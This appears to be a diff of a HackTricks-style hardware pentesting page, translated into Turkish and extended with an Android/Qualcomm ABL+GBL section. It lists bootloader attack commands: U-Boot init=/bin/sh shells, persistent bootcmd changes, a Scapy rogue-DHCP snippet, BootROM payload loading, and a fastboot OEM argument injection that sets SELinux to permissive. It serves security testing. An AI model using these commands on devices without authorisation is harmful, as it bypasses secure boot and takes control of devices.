@@ -1,8 +1,8 @@
-# Bootloader Testing
+# Bootloader Testi
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Aşağıdaki adımlar, cihaz başlangıç yapılandırmalarını değiştirmek ve U-Boot ve UEFI-class loaders gibi bootloader'ları test etmek için önerilir. Erken kod yürütmesini elde etmeye, signature/rollback korumalarını değerlendirmeye ve recovery veya network-boot yollarını istismar etmeye odaklanın.
+Aşağıdaki adımlar, U-Boot ve UEFI-class loaders gibi bootloader'ların başlangıç yapılandırmalarını değiştirmek ve test etmek için önerilir. Erken kod yürütmesi elde etmeye, imza/rollback korumalarını değerlendirmeye ve recovery veya ağ üzerinden önyükleme yollarını kötüye kullanmaya odaklanın.
 
 Related: MediaTek secure-boot bypass via bl2_ext patching:
 
@@ -12,18 +12,18 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 
 ## U-Boot quick wins and environment abuse
 
-1. Access the interpreter shell
-- During boot, hit a known break key (often any key, 0, space, or a board-specific "magic" sequence) before `bootcmd` executes to drop to the U-Boot prompt.
+1. Interpreter shell'e erişim
+- Boot sırasında, `bootcmd` çalışmadan önce bilinen bir break tuşuna basın (genellikle herhangi bir tuş, 0, space veya karta özel bir "magic" dizisi) ve U-Boot prompt'una düşün.
 
-2. Inspect boot state and variables
-- Useful commands:
-- `printenv` (dump environment)
-- `bdinfo` (board info, memory addresses)
-- `help bootm; help booti; help bootz` (supported kernel boot methods)
-- `help ext4load; help fatload; help tftpboot` (available loaders)
+2. Boot durumunu ve değişkenleri inceleyin
+- Faydalı komutlar:
+- `printenv` (environment dökümü)
+- `bdinfo` (board bilgisi, bellek adresleri)
+- `help bootm; help booti; help bootz` (desteklenen kernel boot yöntemleri)
+- `help ext4load; help fatload; help tftpboot` (kullanılabilir yükleyiciler)
 
-3. Modify boot arguments to get a root shell
-- Append `init=/bin/sh` so the kernel drops to a shell instead of normal init:
+3. Root shell almak için boot argümanlarını değiştirin
+- Kernel'in normal init yerine shell'e düşmesi için `init=/bin/sh` ekleyin:
 ```
 # printenv
 # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
@@ -31,8 +31,8 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 # boot    # or: run bootcmd
 ```
 
-4. Netboot from your TFTP server
-- Configure network and fetch a kernel/fit image from LAN:
+4. TFTP sunucunuzdan netboot
+- Ağı yapılandırın ve LAN'dan bir kernel/fit imajı çekin:
 ```
 # setenv ipaddr 192.168.2.2      # device IP
 # setenv serverip 192.168.2.1    # TFTP server IP
@@ -44,31 +44,31 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 # booti ${loadaddr} - ${fdt_addr_r}
 ```
 
-5. Persist changes via environment
-- If env storage isn’t write-protected, you can persist control:
+5. Değişiklikleri environment üzerinden kalıcı hale getirme
+- Eğer env depolama write-protected değilse kontrolü kalıcı hale getirebilirsiniz:
 ```
 # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
 # saveenv
 ```
-- Check for variables like `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` that influence fallback paths. Misconfigured values can grant repeated breaks into the shell.
+- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi fallback yolları etkileyen değişkenleri kontrol edin. Yanlış yapılandırılmış değerler tekrarlı şekilde shell'e girme imkânı verebilir.
 
-6. Check debug/unsafe features
-- Look for: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, ability to `loady`/`loads` via serial, `env import` from untrusted media, and kernels/ramdisks loaded without signature checks.
+6. Debug/unsafe özellikleri kontrol edin
+- Şuna bakın: `bootdelay` > 0, `autoboot` devre dışı, sınırsız `usb start; fatload usb 0:1 ...`, serial üzerinden `loady`/`loads` yeteneği, `env import`'un untrusted medyadan yapılabilmesi, ve kernel/ramdisk'lerin imza kontrolleri olmadan yüklenmesi.
 
-7. U-Boot image/verification testing
-- If the platform claims secure/verified boot with FIT images, try both unsigned and tampered images:
+7. U-Boot image/doğrulama testi
+- Platform FIT imajları ile secure/verified boot iddia ediyorsa, hem unsigned hem de tahrif edilmiş imajları deneyin:
 ```
 # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
 # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
 # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
 ```
-- Absence of `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` or legacy `verify=n` behavior often allows booting arbitrary payloads.
+- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` yokluğu veya legacy `verify=n` davranışı sıklıkla keyfi payload'ların boot edilmesine izin verir.
 
 ## Network-boot surface (DHCP/PXE) and rogue servers
 
-8. PXE/DHCP parameter fuzzing
-- U-Boot’s legacy BOOTP/DHCP handling has had memory-safety issues. For example, CVE‑2024‑42040 describes memory disclosure via crafted DHCP responses that can leak bytes from U-Boot memory back on the wire. Exercise the DHCP/PXE code paths with overly long/edge-case values (option 67 bootfile-name, vendor options, file/servername fields) and observe for hangs/leaks.
-- Minimal Scapy snippet to stress boot parameters during netboot:
+8. PXE/DHCP parametre fuzzing
+- U-Boot'un legacy BOOTP/DHCP işleme kodunda bellek-güvenliği sorunları oldu. Örneğin, CVE‑2024‑42040, crafted DHCP cevapları yoluyla U-Boot belleğinden byte'ların wire üzerinde leak edilmesine neden olan bir bellek açığını tanımlar. DHCP/PXE kod yollarını aşırı uzun/edge-case değerlerle (option 67 bootfile-name, vendor options, file/servername alanları) zorlayın ve takılma/leak davranışlarını gözleyin.
+- Netboot sırasında boot parametrelerini stres etmek için minimal Scapy snippet:
 ```python
 from scapy.all import *
 offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
@@ -83,50 +83,73 @@ DHCP(options=[('message-type','offer'),
 'end']))
 sendp(offer, iface='eth0', loop=1, inter=0.2)
 ```
-- Also validate if PXE filename fields are passed to shell/loader logic without sanitization when chained to OS-side provisioning scripts.
+- Ayrıca PXE filename alanlarının OS tarafı provisioning script'lerine zincirlendiğinde shell/loader mantığına sanitizasyon olmadan geçirilip geçirilmediğini doğrulayın.
 
-9. Rogue DHCP server command injection testing
-- Set up a rogue DHCP/PXE service and try injecting characters into filename or options fields to reach command interpreters in later stages of the boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, or custom Scapy scripts work well. Ensure you isolate the lab network first.
+9. Rogue DHCP server komut enjeksiyonu testi
+- Rogue bir DHCP/PXE servisi kurun ve filename veya options alanlarına karakterler enjekte ederek boot zincirinin sonraki aşamalarında komut yorumlayıcılarına ulaşmaya çalışın. Metasploit’in DHCP auxiliary modülü, `dnsmasq` veya custom Scapy script'leri iyi çalışır. Önce lab ağını izole ettiğinizden emin olun.
 
-## SoC ROM recovery modes that override normal boot
+## SoC ROM recovery modları normal boot'u geçersiz kılar
 
-Many SoCs expose a BootROM "loader" mode that will accept code over USB/UART even when flash images are invalid. If secure-boot fuses aren’t blown, this can provide arbitrary code execution very early in the chain.
+Birçok SoC, flash imajları geçersiz olsa bile USB/UART üzerinden kod kabul eden BootROM "loader" modunu açığa çıkarır. Eğer secure-boot fuse/OTP'leri yakılmadıysa, bu zincirde çok erken aşamada keyfi kod yürütmesi sağlayabilir.
 
 - NXP i.MX (Serial Download Mode)
 - Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
-- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
+- Örnek: `imx-usb-loader u-boot.imx` ile custom bir U-Boot'u RAM'den çalıştırın.
 - Allwinner (FEL)
 - Tool: `sunxi-fel`.
-- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
+- Örnek: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
 - Rockchip (MaskROM)
 - Tool: `rkdeveloptool`.
-- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.
+- Örnek: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ile bir loader sahneleyip custom U-Boot yükleyin.
 
-Assess whether the device has secure-boot eFuses/OTP burned. If not, BootROM download modes frequently bypass any higher-level verification (U-Boot, kernel, rootfs) by executing your first-stage payload directly from SRAM/DRAM.
+Cihazın secure-boot eFuse/OTP'lerinin yakılıp yakılmadığını değerlendirin. Eğer yakılmamışsa, BootROM download modları sıklıkla U-Boot, kernel, rootfs gibi üst seviye doğrulamaları atlayarak ilk aşama payload'unuzu doğrudan SRAM/DRAM'de çalıştırır.
 
 ## UEFI/PC-class bootloaders: quick checks
 
-10. ESP tampering and rollback testing
-- Mount the EFI System Partition (ESP) and check for loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
-- Try booting with downgraded or known-vulnerable signed boot components if Secure Boot revocations (dbx) aren’t current. If the platform still trusts old shims/bootmanagers, you can often load your own kernel or `grub.cfg` from the ESP to gain persistence.
+10. ESP tahrifi ve rollback testi
+- EFI System Partition (ESP)'i mount edin ve loader bileşenlerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo yolları.
+- Eğer Secure Boot revocations (dbx) güncel değilse, downgrade edilmiş veya bilinen-vulnerable imzalı boot bileşenleri ile boot etmeyi deneyin. Platform eski shim/bootmanager'ları hala trust ediyorsa, ESP'den kendi kernel'inizi veya `grub.cfg`'nizi yükleyerek persistence elde edebilirsiniz.
 
-11. Boot logo parsing bugs (LogoFAIL class)
-- Several OEM/IBV firmwares were vulnerable to image-parsing flaws in DXE that process boot logos. If an attacker can place a crafted image on the ESP under a vendor-specific path (e.g., `\EFI\<vendor>\logo\*.bmp`) and reboot, code execution during early boot may be possible even with Secure Boot enabled. Test whether the platform accepts user-supplied logos and whether those paths are writable from the OS.
+11. Boot logo parsing hataları (LogoFAIL class)
+- Birçok OEM/IBV firmware'i, boot logolarını işleyen DXE parçalarında image-parsing hatalarına karşı savunmasızdı. Eğer bir saldırgan ESP üzerine vendor-specific bir path'e (ör. `\EFI\<vendor>\logo\*.bmp`) crafted bir imaj yerleştirebiliyorsa ve reboot yapabiliyorsa, Secure Boot açık olsa bile erken boot sırasında kod yürütmesi mümkün olabilir. Platformun kullanıcı tarafından sağlanan logoları kabul edip etmediğini ve bu yolların OS'den yazılabilir olup olmadığını test edin.
 
-## Hardware caution
+## Android/Qualcomm ABL + GBL (Android 16) güven boşlukları
 
-Be cautious when interacting with SPI/NAND flash during early boot (e.g., grounding pins to bypass reads) and always consult the flash datasheet. Mistimed shorts can corrupt the device or the programmer.
+Qualcomm'un ABL'sini kullanarak `efisp` partition'ından Generic Bootloader Library (GBL) yükleyen Android 16 cihazlarda, ABL'nin `efisp`'den yüklediği UEFI app'i authenticate edip etmediğini doğrulayın. Eğer ABL sadece UEFI app'in varlığını kontrol ediyor ve imzaları doğrulamıyorsa, `efisp`'e yazma primitive'i pre-OS unsigned kod yürütmesi (boot sırasında) sağlar.
 
-## Notes and additional tips
+Pratik kontroller ve kötüye kullanım yolları:
 
-- Try `env export -t ${loadaddr}` and `env import -t ${loadaddr}` to move environment blobs between RAM and storage; some platforms allow importing env from removable media without authentication.
-- For persistence on Linux-based systems that boot via `extlinux.conf`, modifying the `APPEND` line (to inject `init=/bin/sh` or `rd.break`) on the boot partition is often enough when no signature checks are enforced.
-- If userland provides `fw_printenv/fw_setenv`, validate that `/etc/fw_env.config` matches the real env storage. Misconfigured offsets let you read/write the wrong MTD region.
+- efisp write primitive: `efisp`'e custom bir UEFI app yazmak için bir yol gerekir (root/privileged servis, OEM app bug, recovery/fastboot yolu). Bunu yapmadan GBL yükleme boşluğu doğrudan erişilebilir olmaz.
+- fastboot OEM argument injection (ABL bug): Bazı build'ler `fastboot oem set-gpu-preemption` komutunda ekstra token'ları kabul edip bunları kernel cmdline'a ekliyor. Bu, SELinux'u permissive yapmak gibi korumalı partition yazma izinlerini zorlamak için kullanılabilir:
+```bash
+fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
+```
+Eğer cihaz patched ise, komut ekstra argümanları reddetmelidir.
+- Bootloader unlock via persistent flags: Boot-stage bir payload kalıcı unlock flag'lerini (ör. `is_unlocked=1`, `is_unlocked_critical=1`) flip ederek `fastboot oem unlock`'u OEM sunucu/onay kapıları olmadan taklit edebilir. Bu bir sonraki reboot sonrası kalıcı bir durum değişikliği olur.
+
+Defansif/triage notları:
+
+- ABL'nin `efisp`'ten gelen GBL/UEFI payload üzerinde signature doğrulaması yapıp yapmadığını teyit edin. Yapmıyorsa `efisp` yüksek riskli bir persistence yüzeyi olarak değerlendirilmelidir.
+- ABL fastboot OEM handler'larının argüman sayılarını validate edip ekstra token'ları reddedecek şekilde patchlenip patchlenmediğini takip edin.
+
+## Donanım uyarısı
+
+Erken boot sırasında (ör. okuma atlamak için pinleri topraklamak) SPI/NAND flash ile etkileşimde bulunurken dikkatli olun ve her zaman flash datasheet'ini kontrol edin. Zamanlanmamış kısa devreler cihazı veya programmer'ı bozabilir.
+
+## Notlar ve ek ipuçları
+
+- `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` ile environment blob'larını RAM ve depolama arasında taşımayı deneyin; bazı platformlar auth olmadan çıkarılabilir medyadan env import edilmesine izin verir.
+- extlinux.conf ile boot eden Linux tabanlı sistemlerde persistence için boot partition üzerindeki `APPEND` satırını değiştirmek (ör. `init=/bin/sh` veya `rd.break` eklemek) genellikle imza kontrolleri yoksa yeterlidir.
+- Kullanıcı alanı `fw_printenv/fw_setenv` sağlıyorsa, `/etc/fw_env.config`'in gerçek env depolama ile eşleştiğini doğrulayın. Yanlış yapılandırılmış offset'ler yanlış MTD bölgesini okuma/yazma imkânı verebilir.
 
 ## References
 
 - [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 - [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
 - [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
-
+- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
+- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
+- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
+- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
+- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
 {{#include ../../banners/hacktricks-training.md}}
